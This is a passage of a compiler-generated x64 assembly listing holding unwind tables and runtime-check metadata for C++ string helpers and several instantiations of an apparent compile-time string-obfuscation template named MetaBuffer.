	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	016dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 025054c19H
	DD	011d2322H
	DD	07016002dH
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	0158H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+7
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc DD 088H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1
	DD	048H
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0
	ORG $+96
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData DD 02H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	040H
	DW	01aeH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 025054719H
	DD	0118231dH
	DD	070110037H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	01a0H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	050H
	DB	072H
	DB	06fH
	DB	078H
	DB	079H
	DB	00H
	ORG $+1
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+15
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc DD 0c8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2
	DD	0a8H
	DD	08H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1
	DD	084H
	DD	01H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0
	ORG $+144
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData DD 03H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD 025051c01H
	DD	0117231cH
	DD	07010001dH
	DD	0500fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0479H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02d5H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	0185H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	022dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	0185H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0329H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	022dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0131H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
